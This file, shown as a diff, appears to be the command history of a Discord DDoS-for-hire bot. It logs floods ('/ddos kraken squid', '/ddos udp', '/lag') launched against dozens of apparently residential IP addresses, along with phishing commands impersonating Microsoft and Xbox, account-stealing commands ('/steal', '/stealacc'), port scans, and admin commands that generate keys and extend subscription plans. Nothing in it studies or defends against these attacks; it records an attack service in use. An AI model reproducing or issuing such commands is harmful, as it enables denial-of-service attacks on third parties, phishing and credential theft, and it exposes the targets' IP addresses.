@@ -1,0 +1,208 @@
+/ddos std 73.73.157.121 3600
+/tr4p
+/tr4p
+/ddos std 173.175.244.218 3600
+/ddos std 216.213.76.85 100
+/reboot
+/ddos std 104.136.26.239 3600
+/ddos std 104.136.26.239 3600
+/ddos udp 104.136.26.239 3500
+/tr4p
+/ping 173.212.83.8
+/ping 47.23.208.53
+/ping 24.69.166.119
+/ping 128.116.119.3
+/info
+/ping 173.212.83.8
+/ping 24.69.166.119
+/info
+/steal
+/stealacc
+/tr4p
+/tr4p
+/phish
+/cping 192.168.1.115
+/ping 192.168.1.115
+/ping 192.168.1.115
+/ping 192.168.1.115
+/ddos udp 151.231.60.27
+/ddos udp 151.231.60.27 3600
+/ddos udp 46.65.26.196 3600
+/cping 151.231.60.27
+/ddos udp 68.34.69.45 3600
+/cping 192.168.30.17
+/ddos ovh 192.168.30.17 100
+/ddos std 75 .136.70.174 3600
+/ddos udp 75 .136.70.174 3600
+/ddos std 75.136.70.174 3600
+/cping
+/ddos std 75.136.70.174 3600
+/cping 75.136.70.174
+/phish Microsoft
+/phishquit
+/phishquit
+/phis
+/tr4p
+/phish site
+/phishquit
+/phishquit
+/phishquit
+/phish
+/run
+/phishquit
+/phish Xbox
+/phish Microsoft
+/phish quit
+/phish Microsoft
+/phishquit
+/phish Microsoft
+/check
+/check
+/mega
+/cping 69.10.96.233
+/ddos std 38.132.108.10 60 sport=80
+/ping 38.132.108.10
+/plan
+/plan
+/lag dns 1.0.1.0.1 2 120
+/plan
+/methods
+/lag std 73.73.73.73 10 min 5min 1000
+/lag std 73.73.73.73 10 min 5min 1000
+/lag std 73.73.73.73 10 5 1000
+/lagstop
+/plans
+/ddos std 47.217.130.80 3600 dport=80
+/checkip 47.217.130.80
+/ping 47.217.130.80
+/checkip 47.217.130.80
+/ping 47.217.130.80
+/nordvpn
+/accounts
+/vpn
+/ban <@710450621127327764>
+/plan
+/plan
+/tr4p
+/sms
+/dms
+/sms
+/tr4p
+/ping 66.16.8.144.
+/tr4p
+/ddos kraken squid 66.16.8.144 1300
+/ddos kraken squid 66.16.8.144 1300
+/ping 66.16.8.144
+/and
+/sms
+/tr4p
+/claim
+/generatekeys
+/generatekeys
+/claim key TRoVtS68UzMEzuXtYFU9sVdGFTHA837G3L1VqA2z9I11nbaioK
+/claim key TRoVtS68UzMEzuXtYFU9sVdGFTHA837G3L1VqA2z9I11nbaioK
+/generatekeys trial 3
+/plan
+/admin
+/admin
+/increaseplan <@672652603880112148> length 4
+/ddos kraken squid 207.195.62.169 4000
+/ddos kraken squid 207.195.62.169 3600
+/change plan <@437709879155621889> 4
+/change plan <@437709879155621889> 4
+/plan
+/add plan 4
+/admin
+/increaseplan <@437709879155621889> 4
+/plan
+/plan
+/plan
+/change plan <@437709879155621889> 4
+/changeplan <@437709879155621889> 4
+/plan
+/increaseplan <@437709879155621889> 4
+/plan
+/reboot
+/admin
+/reboot
+/plan
+/increaseplan <@437709879155621889> 10y
+/ddos kraken squid 108.87.164.65 3600
+/plan
+/changeplan 5
+/plan
+/increaseplan <@437709879155621889> 1000y
+/plan
+/changeplan <@437709879155621889> 4
+/plan
+/ddos kraken squid 108.87.164.65 3600
+/plan
+/plan
+/tr4p
+/ddos kraken squid 108.18.217.117 3200 80
+/ddos kraken squid 68.203.43.85 3200 80
+/ddos kraken squid 73.2.203.129 3200 80
+/ddos kraken squid 68.203.43.85 3200 80
+/ddos kraken squid 72.196.10.7 3200 80
+/ddos kraken squid 72.196.10.7 3200 80
+/ddos godzilla Xmas 72.196.10.7 3200 80
+/ddos kraken std 72.196.10.7 3200 53
+/sms
+/plan
+/claim  TRU63AIglyQuSHOHqNrGUNA1D7xVMSQ4gDrxINgVyrMeQOocV6
+/claim TRU63AIglyQuSHOHqNrGUNA1D7xVMSQ4gDrxINgVyrMeQOocV6
+/claim TRmFAgFAMFTAqVEFaN9ouoKGgb0WfBzOWx0yK9V0bqnzlZBZx5
+/claim TRmFAgFAMFTAqVEFaN9ouoKGgb0WfBzOWx0yK9V0bqnzlZBZx5
+/plan
+/plan
+/admin
+/admin
+/plan
+/plan
+/changeplan <@437709879155621889> 4
+/changeplan <@437709879155621889> 4
+/plan
+/plan
+/increaseplan 10y
+/increaseplan 10y
+/increaseplan <@437709879155621889> 10y
+/plan
+/plan
+/ddos kraken squid 94.193.121.45
+/ddos kraken squid 94.193.121.45 80 3200
+/ddos kraken squid 94.193.121.45 80 3700
+/ddos kraken squid 82.6.161.201 80 3800
+/ddos kraken squid 82.6.161.201 3800 80
+/ddos kraken squid 24.214.47.183 80 3800
+/ddos kraken squid 24.214.47.183 3800 80
+/ddos kraken squid 66.255.241.34 3800 80
+/ddos kraken squid 68.114.130.144 3200 80
+/ddos kraken squid 73.22.187.223 3200 80
+/ddos kraken squid 72.216.67.34 120
+/ping 72.216.67.34
+/tr4p
+/methods
+/ddos kraken std 72.216.67.34 120
+/ddos kraken squid 108.185.61.46 200
+/ddos kraken squid 162.212.141.245 1200
+/ddos kraken squid 74.65.21.180 1200
+/ddos kraken squid 74.65.21.180 200
+/ddos kraken squid 169.127.133.111 200
+/tr4p
+/nmap 71.185.50.245
+/nmapresult 71.185.50.245
+/nmapresult 71.185.50.245
+/checkip 71.185.50.245
+/ddos kraken squid 73.101.104.113 200
+/ddos kraken squid 68.51.231.184 200
+/ddos kraken squid 24.171.200.2191800
+/ddos kraken squid 24.171.200.219 1200
+/ddos /ddos kraken squid 68.51.231.184 1200
+/ddos kraken squid 68.51.231.184 1200
+/ddos kraken squid 69.136.237.93 1000
+/ddos kraken squid 173.44.107.248 200
+/ddos kraken squid 174.111.227.191 1200
+/ddos kraken squid 174.99.92.36 200
+/tr4p
+/methods
+/ddos kraken udp 174.99.92.36 200
